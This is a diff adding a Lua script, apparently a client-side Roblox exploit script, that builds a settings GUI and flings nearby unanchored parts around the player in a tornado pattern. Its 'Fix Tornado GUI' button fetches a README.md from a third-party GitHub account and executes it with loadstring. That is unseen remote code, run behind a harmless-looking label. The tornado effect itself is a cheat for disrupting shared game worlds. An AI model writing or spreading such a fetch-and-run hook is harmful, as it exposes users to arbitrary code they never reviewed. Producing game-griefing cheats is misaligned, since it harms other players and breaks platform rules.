@@ -1,0 +1,284 @@
+-- Rope / Tilted Tornado (strong spin speed, top shifts sides, bottom follows player)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local localPlayer = Players.LocalPlayer
+
+-- Tornado settings
+local enabled = false
+local tornadoSpinSpeed = 80
+local tornadoUpwardSpeed = 50
+local tornadoRadius = 40
+local tornadoWindfield = 400
+local tornadoInwardPullSpeed = 50
+
+-- Funnel behavior (top side shifting)
+local funnelSidewaysReach = 300
+local holdDuration = 20
+local topRadius = 8
+local bottomRadius = tornadoRadius
+
+-- Safety / clamp settings
+local maxVelocityMag = 200
+local maxPartMass = 500
+local partDropYThreshold = -500
+local reachTolerance = 40
+
+-- Funnel angle state
+local currentAngle = math.random() * math.pi * 2
+local targetAngle = currentAngle
+local lastChangeTime = os.clock()
+local transitioning = false
+local transitionStart = 0
+local transitionTime = 1.5 -- fixed internal time for smooth shifting
+
+local pickedUpByFunnel = {}
+local whitelistedParts = {}
+local baseplateName = "Baseplate"
+
+-- GUI setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TornadoBlastGUI"
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 100
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+local hideToggle = Instance.new("TextButton")
+hideToggle.Size = UDim2.new(0, 40, 0, 20)
+hideToggle.Position = UDim2.new(0, 10, 0.5, -10)
+hideToggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+hideToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+hideToggle.Font = Enum.Font.SourceSansBold
+hideToggle.TextSize = 14
+hideToggle.Text = "Hide"
+hideToggle.Parent = screenGui
+
+local inputsVisible = true
+local function toggleInputs()
+    inputsVisible = not inputsVisible
+    for _, child in ipairs(screenGui:GetChildren()) do
+        if (child:IsA("TextBox") or child:IsA("TextLabel")) and not (child == hideToggle or child == toggleBtn or child == fixGuiBtn) then
+            child.Visible = inputsVisible
+        end
+    end
+end
+
+hideToggle.MouseButton1Click:Connect(function()
+    toggleInputs()
+    hideToggle.Text = inputsVisible and "Hide" or "Show"
+end)
+
+local function createLabeledTextbox(labelText, default, index)
+    local perRow = 4
+    local row = math.floor(index / perRow)
+    local col = index % perRow
+    local xOffset = 0.02 + 0.25 * col
+    local yOffset = 60 + (row * 60)
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0, 160, 0, 16)
+    label.Position = UDim2.new(xOffset, 0, 0, yOffset)
+    label.BackgroundTransparency = 1
+    label.Text = labelText
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Font = Enum.Font.SourceSans
+    label.TextSize = 14
+    label.ZIndex = 2
+    label.Parent = screenGui
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0, 160, 0, 20)
+    box.Position = UDim2.new(xOffset, 0, 0, yOffset + 18)
+    box.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+    box.TextColor3 = Color3.fromRGB(0, 0, 0)
+    box.Font = Enum.Font.SourceSans
+    box.TextSize = 14
+    box.Text = tostring(default)
+    box.ZIndex = 2
+    box.Parent = screenGui
+
+    return box
+end
+
+-- Inputs (removed Funnel Height, Orbit Cap, and Transition Time)
+local inputBoxes = {
+    {"Spin Speed", tornadoSpinSpeed},
+    {"Upward Speed", tornadoUpwardSpeed},
+    {"Rotation Radius", tornadoRadius},
+    {"Windfield Radius", tornadoWindfield},
+    {"Inward Pull Speed", tornadoInwardPullSpeed},
+    {"Sideways Reach", funnelSidewaysReach},
+    {"Hold Duration (s)", holdDuration},
+}
+
+local references = {}
+for i, data in ipairs(inputBoxes) do
+    references[i] = createLabeledTextbox(data[1], data[2], i - 1)
+end
+
+references[1].FocusLost:Connect(function() local v = tonumber(references[1].Text); if v then tornadoSpinSpeed = v end end)
+references[2].FocusLost:Connect(function() local v = tonumber(references[2].Text); if v then tornadoUpwardSpeed = v end end)
+references[3].FocusLost:Connect(function() local v = tonumber(references[3].Text); if v then tornadoRadius = v; bottomRadius = v end end)
+references[4].FocusLost:Connect(function() local v = tonumber(references[4].Text); if v then tornadoWindfield = v end end)
+references[5].FocusLost:Connect(function() local v = tonumber(references[5].Text); if v then tornadoInwardPullSpeed = v end end)
+references[6].FocusLost:Connect(function() local v = tonumber(references[6].Text); if v then funnelSidewaysReach = v end end)
+references[7].FocusLost:Connect(function() local v = tonumber(references[7].Text); if v then holdDuration = v end end)
+
+-- Toggle button
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 24, 0, 24)
+toggleBtn.Position = UDim2.new(0.5, -130, 0, 10)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleBtn.Font = Enum.Font.SourceSansBold
+toggleBtn.TextSize = 16
+toggleBtn.Text = "O"
+toggleBtn.ZIndex = 2
+toggleBtn.Parent = screenGui
+
+local fixGuiBtn = Instance.new("TextButton")
+fixGuiBtn.Size = UDim2.new(0, 120, 0, 24)
+fixGuiBtn.Position = UDim2.new(0.5, 140, 0, 40)
+fixGuiBtn.BackgroundColor3 = Color3.fromRGB(50, 80, 50)
+fixGuiBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+fixGuiBtn.Font = Enum.Font.SourceSansBold
+fixGuiBtn.TextSize = 14
+fixGuiBtn.Text = "Fix Tornado GUI"
+fixGuiBtn.Parent = screenGui
+
+-- Helpers
+local function isPlayerPart(part)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Character and part:IsDescendantOf(plr.Character) then
+            return true
+        end
+    end
+    return false
+end
+
+local function closestPointOnSegment(a, b, p)
+    local ab = b - a
+    local denom = ab:Dot(ab)
+    local t = denom > 0 and math.clamp((p - a):Dot(ab) / denom, 0, 1) or 0
+    return a + ab * t, t
+end
+
+local function wrapAngle(a)
+    local twoPi = 2 * math.pi
+    return ((a % twoPi) + twoPi) % twoPi
+end
+
+local function shortestAngleDiff(a, b)
+    local diff = (b - a) % (2 * math.pi)
+    if diff > math.pi then diff = diff - 2 * math.pi end
+    return diff
+end
+
+local function pickNewTargetAngle()
+    targetAngle = math.random() * 2 * math.pi
+    transitionStart = os.clock()
+    transitioning = true
+end
+
+local function updateAngle()
+    local now = os.clock()
+    if not transitioning and now - lastChangeTime >= holdDuration then
+        pickNewTargetAngle()
+        lastChangeTime = now
+    end
+    if transitioning then
+        local alpha = math.clamp((now - transitionStart) / transitionTime, 0, 1)
+        local diff = shortestAngleDiff(currentAngle, targetAngle)
+        currentAngle = wrapAngle(currentAngle + diff * alpha)
+        if alpha >= 1 then transitioning = false end
+    end
+end
+
+local function safeVelocity(part, vel)
+    if not part or not part.Parent then return end
+    if vel.Magnitude > maxVelocityMag then vel = vel.Unit * maxVelocityMag end
+    pcall(function()
+        part.AssemblyLinearVelocity = vel
+        part.CanCollide = false
+    end)
+end
+
+-- Core tornado
+local function applyTornado(rootPos)
+    updateAngle()
+
+    local topOffset = Vector3.new(math.cos(currentAngle) * funnelSidewaysReach, tornadoRadius * 2, math.sin(currentAngle) * funnelSidewaysReach)
+    local funnelTop = rootPos + topOffset
+    local funnelBottom = rootPos
+    local axisVec = funnelBottom - funnelTop
+    local axisLen = axisVec.Magnitude
+    if axisLen <= 0 then return end
+
+    local parts = Workspace:GetPartBoundsInRadius(rootPos, tornadoWindfield)
+
+    for _, part in ipairs(parts) do
+        if part:IsA("BasePart") and not part.Anchored and not isPlayerPart(part) and part.Name ~= baseplateName then
+            local mass = part:GetMass()
+            if mass < maxPartMass then
+                local closestPoint, rel = closestPointOnSegment(funnelTop, funnelBottom, part.Position)
+                local radiusAt = topRadius * (1 - rel) + bottomRadius * rel
+
+                local offset = part.Position - closestPoint
+                local horizontal = Vector3.new(offset.X, 0, offset.Z)
+                local dist = horizontal.Magnitude
+
+                if dist <= radiusAt + reachTolerance then
+                    local radialDir = (horizontal.Magnitude > 0 and -horizontal.Unit or Vector3.zero)
+                    local radialPull = radialDir * tornadoInwardPullSpeed
+
+                    local spinDir = Vector3.new(-horizontal.Z, 0, horizontal.X)
+                    if spinDir.Magnitude > 0 then spinDir = spinDir.Unit end
+                    local tangential = spinDir * tornadoSpinSpeed -- full speed now
+
+                    local upward = Vector3.new(0, tornadoUpwardSpeed, 0)
+
+                    local vel = tangential + radialPull + upward
+                    safeVelocity(part, vel)
+                end
+            end
+        end
+    end
+end
+
+local function tornadoLoop()
+    while enabled do
+        local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            applyTornado(root.Position)
+        end
+        task.wait(0.06)
+    end
+end
+
+toggleBtn.MouseButton1Click:Connect(function()
+    enabled = not enabled
+    toggleBtn.Text = enabled and "X" or "O"
+    if enabled then
+        pickedUpByFunnel, whitelistedParts = {}, {}
+        currentAngle = math.random() * 2 * math.pi
+        targetAngle = currentAngle
+        lastChangeTime = os.clock()
+        transitioning = false
+        task.spawn(tornadoLoop)
+    else
+        for p in pairs(whitelistedParts) do
+            if p and p:IsA("BasePart") then
+                pcall(function() p.AssemblyLinearVelocity = Vector3.zero; p.CanCollide = true end)
+            end
+        end
+        pickedUpByFunnel, whitelistedParts = {}, {}
+    end
+end)
+
+fixGuiBtn.MouseButton1Click:Connect(function()
+    local s, e = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md"))()
+    end)
+    if not s then warn("Fix GUI failed:", e) end
+end)
